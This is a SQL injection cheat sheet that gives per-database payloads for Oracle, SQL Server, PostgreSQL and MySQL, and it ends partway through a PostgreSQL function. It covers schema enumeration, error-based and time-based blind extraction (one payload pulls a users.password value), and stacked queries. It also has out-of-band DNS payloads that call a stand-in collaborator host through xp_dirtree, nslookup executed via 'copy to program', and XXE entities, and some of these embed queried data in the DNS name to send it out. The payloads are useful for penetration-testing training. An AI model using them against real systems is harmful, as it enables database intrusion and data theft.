# SQL Injection Cheat Sheet 📌

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

---

## String Concatenation
You can concatenate together multiple strings to make a single string.

Oracle  
`'foo'||'bar'`

Microsoft  
`'foo'+'bar'`

PostgreSQL  
`'foo'||'bar'`

MySQL  
`'foo' 'bar'` [Note the space between the two strings]  
`CONCAT('foo','bar')`

---

## Substring
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based.

Oracle  
`SUBSTR('foobar', 4, 2)`

Microsoft  
`SUBSTRING('foobar', 4, 2)`

PostgreSQL  
`SUBSTRING('foobar', 4, 2)`

MySQL  
`SUBSTRING('foobar', 4, 2)`

---

## Comments
You can use comments to truncate a query and remove the portion of the original query that follows your input.

Oracle  
`--comment`

Microsoft  
`--comment`  
`/*comment*/`

PostgreSQL  
`--comment`  
`/*comment*/`

MySQL  
`#comment`  
`-- comment` [Note the space after --]  
`/*comment*/`

---

## Database Version
You can query the database to determine its type and version.

Oracle  
`SELECT banner FROM v$version`  
`SELECT version FROM v$instance`

Microsoft  
`SELECT @@version`

PostgreSQL  
`SELECT version()`

MySQL  
`SELECT @@version`

---

## Database Contents
You can list tables and columns in the database.

Oracle  
`SELECT * FROM all_tables`  
`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`

Microsoft  
`SELECT * FROM information_schema.tables`  
`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

PostgreSQL  
`SELECT * FROM information_schema.tables`  
`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

MySQL  
`SELECT * FROM information_schema.tables`  
`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

---

## Conditional Errors
Test a boolean condition and trigger an error if true.

Oracle  
`SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`

Microsoft  
`SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END`

PostgreSQL  
`1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)`

MySQL  
`SELECT IF(condition,(SELECT table_name FROM information_schema.tables),'a')`

---

## Extracting Data via Visible Errors

Microsoft  

SELECT 'foo' WHERE 1 = (SELECT 'secret')
-- Conversion failed when converting varchar 'secret' to int


PostgreSQL  

SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
-- invalid input syntax for integer


MySQL  

SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT 'secret')))
-- XPATH syntax error


---

## Batched (Stacked) Queries

Oracle  
Not supported

Microsoft  
`QUERY-1; QUERY-2`

PostgreSQL  
`QUERY-1; QUERY-2`

MySQL  
`QUERY-1; QUERY-2`

Note: MySQL stacked queries may not always work depending on API.

---

## Time Delays

Oracle  
`dbms_pipe.receive_message(('a'),10)`

Microsoft  
`WAITFOR DELAY '0:0:10'`

PostgreSQL  
`SELECT pg_sleep(10)`

MySQL  
`SELECT SLEEP(10)`

---

## Conditional Time Delays

Oracle  
`SELECT CASE WHEN (condition) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`

Microsoft  
`IF (condition) WAITFOR DELAY '0:0:10'`

PostgreSQL  
`SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END`

MySQL  
`SELECT IF(condition,SLEEP(10),'a')`

---

## DNS Lookup

Oracle  

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [

<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/"> %remote;]>'),'/l')

FROM dual


Microsoft  
`exec master..xp_dirtree '//BURP-COLLABORATOR/a'`

PostgreSQL  
`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'`

MySQL (Windows only)  
`LOAD_FILE('\\\\BURP-COLLABORATOR\\a')`

---

## DNS Lookup with Data Exfiltration

Oracle  

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [

<!ENTITY % remote SYSTEM "http://'||(SELECT data)||'.BURP/"> %remote;]>'),'/l')

FROM dual


Microsoft  

DECLARE @p VARCHAR(1024);
SET @p=(SELECT data);
EXEC('master..xp_dirtree "//'+@p+'.BURP/a"')


PostgreSQL  

CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
DECLARE c text;
DECLARE p text;
BEGIN
SELECT INTO p (SELECT data);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP''';
EXECUTE c;
END;
